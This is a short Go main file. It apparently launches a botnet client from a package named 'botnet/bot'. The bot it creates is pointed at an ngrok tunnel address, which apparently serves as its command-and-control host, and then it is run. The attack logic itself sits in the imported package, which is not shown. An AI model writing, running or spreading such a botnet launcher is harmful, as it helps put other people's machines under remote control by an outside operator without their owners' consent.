package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("335d6842.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Run()
}
